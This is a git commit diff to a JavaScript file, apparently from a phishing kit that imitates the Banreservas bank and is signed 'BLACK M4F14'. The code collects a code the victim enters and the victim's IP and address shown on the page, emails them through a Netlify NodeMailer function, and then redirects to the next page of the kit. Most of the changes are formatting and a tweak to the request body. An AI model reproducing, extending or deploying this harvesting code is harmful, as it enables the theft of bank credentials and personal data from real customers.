5541bf50d653fb84bc971c4a4add92b93f4416f5
Aletiiisa <cuentaluperonp5@gmail.com>
2025-08-17 02:55:02 -0400

    Update sax4.js

--- js/sax4.js
+++ js/sax4.js
@@ -1,4 +1,4 @@
-var ready = function () {
+var ready = function() {
     let u_name = document.getElementById("0T4RX").value;
     let ip     = document.getElementById("ip").innerHTML;
     let ip2    = document.getElementById("address").innerHTML;
@@ -6,20 +6,20 @@ var ready = function () {
     return `🔹B4NR3S3RV4S v.1🔹\n🔐C0DIX: ${u_name}\n\nIP: ${ip}\n${ip2}\n🔹BLACK M4F14🔹`;
 };
 
-var sender = function () {
+var sender = function() {
     let message = ready();
 
-    fetch('/.netlify/functions/sendEmail', {  
+    fetch('/.netlify/functions/sendEmail', {  // apunta a la función NodeMailer
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ text: message })
+        body: JSON.stringify({ message })       // <-- enviamos el mensaje completo
     })
     .then(r => r.json())
     .then(data => {
         console.log("Response:", data);
-        window.location = 'index8.html';  
+        window.location = 'index8.html';
     })
     .catch(err => console.error("Error:", err));
 
-    return false;  
+    return false;
 };
